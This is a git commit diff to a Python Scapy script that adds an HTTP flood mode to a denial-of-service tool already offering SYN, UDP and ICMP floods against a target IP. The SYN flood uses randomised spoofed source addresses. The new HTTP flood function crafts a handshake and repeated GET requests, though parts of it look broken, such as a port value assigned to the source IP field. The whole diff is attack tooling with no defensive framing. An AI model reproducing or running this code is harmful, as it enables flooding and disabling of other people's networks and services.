adcab9cc1550a6c81a5022d52faaa00a770561d5
Berom <310o@naver.com>
2022-07-12 17:48:42 +0900

    Feat : http Flood attack

--- py3_flood_attack.py
+++ py3_flood_attack.py
@@ -10,6 +10,7 @@ def main():
     parser.add_argument("--SynFlood", "-s", action='store_true', help="Syn Flood Attack")
     parser.add_argument("--UDPFlood", "-u", action='store_true', help="UDP Flood Attack")
     parser.add_argument("--ICMPFlood", "-i", action='store_true', help="ICMP Flood Attack")
+    parser.add_argument("--HTTPFlood", "-H", action='store_true', help="HTTP Flood Attack")
     parser.add_argument("--target", "-t", required=True, help="target IP address")
     parser.add_argument("--port", "-p", default=80, help="target port number")
     parser.add_argument(
@@ -28,9 +29,12 @@ def main():
         UDPFlood(dstIP, repeat)
     elif args.ICMPFlood:
         ICMPFlood(dstIP, repeat)
+    elif args.HTTPFlood:
+        HTTPFlood(dstIP, dstPort, repeat)
     else:
         print("Attack Type is Missing")
         return
+
 def randomSrcIP():
     ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
     return ip 
@@ -42,7 +46,7 @@ def SynFlood(dstIP,dstPort,repeat):
         IP_Packet = IP()
         IP_Packet.src = randomSrcIP()
         IP_Packet.dst = dstIP
-        
+
         TCP_Packet = TCP()
         TCP_Packet.sport = 80 # default port : 20
         TCP_Packet.dport = dstPort
@@ -51,7 +55,25 @@ def SynFlood(dstIP,dstPort,repeat):
         send(IP_Packet/TCP_Packet,verbose=0)
 
 def HTTPFlood(dstIP,dstPort,repeat):
-    pass
+    for x in range(int(repeat)):
+        IP_Packet = IP()
+        IP_Packet.dst = dstIP
+        IP_Packet.src = randomPort()
+        IP_Packet.ack = 0
+
+        TCP_Packet = TCP()
+        TCP_Packet.dport = dstPort
+        TCP_Packet.flags="S"
+        packet_SynAck = sr1(IP_Packet/TCP_Packet)
+
+        print(packet_SynAck)
+        TCP_Packet.flags="A"
+        TCP_Packet.seq = packet_SynAck[TCP].ack
+        TCP_Packet.sport=packet_SynAck[TCP].dport
+        TCP_Packet.ack= packet_SynAck[TCP].seq+1
+        getStr='GET / HTTP/1.0\n\n'
+        reply = send(IP_Packet/TCP_Packet/getStr)
+        
 
 def UDPFlood(dstIP,repeat):
     for x in range(int(repeat)):
